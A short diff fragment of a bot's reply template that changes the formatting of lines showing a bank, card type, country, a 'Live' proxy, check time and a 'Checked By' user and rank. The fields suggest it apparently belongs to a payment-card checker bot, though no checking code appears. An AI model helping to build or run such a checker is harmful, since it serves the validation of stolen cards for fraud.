+[↯] 𝗕𝗮𝗻𝗸 <code>$brand</code>
+[↯] 𝗧𝗬𝗣𝗘 <code>$type</code>
+[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 <code>$name $emoji</code>
 ━━━━━━━━━━━━━━━━━━
-[↯] 𝗣𝗥𝗢𝗫𝗬 ↯ <code>$r.XXX.XXX.XX Live ✅</code>
-[↯] 𝗧𝗜𝗠𝗘 ↯ <code>$time seconds</code> 
-[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ↯ @$username <code>[$rank]</code>
-━━━━━━━━━━━━━━━━━━
+[↯] 𝗣𝗥𝗢𝗫𝗬 <code> $r.XXX.XXX.XX Live ✅</code>
+[↯] 𝗧𝗜𝗠𝗘 <code>$time seconds</code> 
+[↯] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username <code>[$rank]</code>
+
 
   </b>";
 
